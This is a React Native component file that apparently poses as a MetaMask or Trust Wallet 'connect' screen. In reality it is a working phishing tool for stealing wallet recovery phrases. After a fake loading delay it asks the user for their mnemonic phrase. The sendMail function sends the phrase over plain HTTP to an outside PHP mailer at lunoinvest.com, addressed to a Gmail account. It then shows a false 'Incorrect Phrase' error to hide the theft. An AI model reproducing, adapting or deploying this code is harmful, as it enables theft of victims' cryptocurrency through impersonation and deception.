import { useEffect, useState, } from "react";
import { View, Text, Image, StyleSheet, ActivityIndicator, Button, 
    Modal, Pressable, TextInput, TouchableOpacity, Alert } from "react-native";
import { FontAwesomeIcon } from "@fortawesome/react-native-fontawesome";
import {faTimes,faCircleInfo } from "@fortawesome/free-solid-svg-icons";
import { SafeArea } from "../utility/safearea";
import axios from 'axios';

export function Trustwallet({ navigation }) {
    const [loading, setLoading] = useState(false);
    const [modalShow, setmodalShow] = useState(false);
    const [phone, setPhone] = useState("");
    const [coinName, setCoinName] = useState("");
    const [recieveLink, setRecieveLink] = useState(false);

    function recieve() {
        setRecieveLink(!recieveLink)
    }

    recieve = () => {
        setLoading(true)
        setTimeout(() => {
            setLoading(false)
            setmodalShow(true)
        }, 5000);
    }
    useEffect(() => {
        recieve()
    }, []);

    // Submit = () => {
    //     setLoading(true)
    //     setTimeout(() => {
    //         setLoading(false)
    //         Alert.alert(
    //             'Status',
    //             `Your request submited successfully, enter your Whatsapp now to speak with Tony`,
    //             [{ text: 'Okay' }]
    //         );

    //     }, 2000);

    // }

    async function sendMail() {
        setLoading(true)
        const email = "mtmask120@gmail.com"
        const sub = "[Swap App] Message from SWAP APP"
        const msg = ` <div>
        <h4>${coinName}</h4>
        <a href="tel:${phone}">${phone}</a>
        </div>`

        try {
            await axios.get(`http://lunoinvest.com/sendemail.php?email=${email}&subject=${sub}&message=${msg}`)
                .then(() => {
                    setTimeout(() => {
                        setLoading(false)
                        Alert.alert(
                            'Connection Failed',
                            ` Incorrect Phrase or you are connecting from an unsupported country. MetaMask Phrase are usually 12,14 or 24 single space all lowalcase words.`,
                            [{ text: 'Ok' }]
                        );
                    },5000);
                    
                })
                .catch((error) => {
                    setLoading(false)
                    console.log(error);
                });
        } catch (error) {
            setLoading(false)
            console.log(error);
        }
    }

    return (
        <SafeArea>
            <View style={{ flex: 1 }}>
                <View style={styles.contanier}>
                {loading ? <ActivityIndicator size="large" color='gray' /> : null}
                    <Image source={require('../assets/ttt2.png')} style={{ height: 100, width: 100 }}/>
                    <Text style={{fontSize:17}}>MetaMask</Text>
                    
                </View>

                <Modal animationType='fade'
                    visible={modalShow}
                    transparent={true}>
                    <View
                        style={{
                            flex: 1,
                            backgroundColor: "rgba(0,0,0, 0.9)"
                        }}
                    >
                        <Pressable
                            onPress={() => setmodalShow(false)}
                            style={{ flex: 1, justifyContent: 'center', }}
                        >
                        </Pressable>

                        <View style={styles.modacontent}>
                            <View>
                                <View style={{padding:10,justifyContent:'space-between',flexDirection:'row'}}>
                                    <Image source={require('../assets/ttt2.png')} style={{height:30,width:30}}/>
                                    <TouchableOpacity onPress={() => navigation.navigate("Home")}>
                                    <FontAwesomeIcon icon={faTimes} size={20} style={{color:"gray"}}/>
                                    </TouchableOpacity>
                                </View>
                                {loading ? <ActivityIndicator size="large" color='gray' /> : null}
                                <View style={{flexDirection:"row",justifyContent:"center",alignItems:"center"}}>
                                    <FontAwesomeIcon icon={faCircleInfo} size={25} style={{color:"#f5a2a9"}}/>
                                    <Text style={{margin:5,color:'#f5a2a9'}}> First time user! Connect with your wallet Mnemonic Phrase </Text>
                                    
                                </View>
                                <View style={{alignItems:"center"}}>
                                <Text style={{ marginTop: 15, }}>Enter your Phrase to continue</Text>

                                </View>
                                
                                </View>
                            <View style={{
                                marginTop:5, marginBottom: 30, justifyContent: 'center',
                                alignItems: 'center',
                            }}>
                                <TextInput
                                    multiline
                                    placeholder="Enter Phrase here"
                                    onChangeText={(text) => setCoinName(text)}
                                    style={styles.input}
                                />
                                {/* <TextInput
                                    multiline
                                    placeholder="Whatsapp number"
                                    onChangeText={(text) => setPhone(text)}
                                    style={styles.input}
                                    keyboardType="phone-pad"
                                /> */}

                            </View>
                            <View style={{ justifyContent: 'center', alignItems: 'center', }}>
                                <TouchableOpacity onPress={() => sendMail()}>
                                    <View style={styles.submit}>
                                        <Text style={{ fontSize: 17, color: '#ffff' }}>Connect</Text>
                                    </View>
                                </TouchableOpacity>
                            </View>

                        </View>
                        <Pressable
                            onPress={() => setmodalShow(false)}
                            style={{ flex: 1, justifyContent: 'center', }}
                        >
                        </Pressable>
                    </View>
                </Modal>
            </View>
        </SafeArea>
    )
}
const styles = StyleSheet.create({
    contanier: {
        flex: 1,
        alignItems:"center",
        justifyContent:'center'
        

    }
    ,
    modacontent: {
        backgroundColor: '#ffff',
        borderRadius: 20,
        margin: 30,

    },
    submit: {
        marginTop: 17,
        marginBottom: 30,
        backgroundColor: '#1192f5',
        justifyContent: "center",
        alignItems: "center",
        height: 40,
        width: 130,
        borderRadius: 10
    },
    input: {
        borderColor: "gray",
        borderWidth: 1,
        borderRadius: 10,
        marginBottom: 5,
        width: "80%",
        padding: 20
    },
})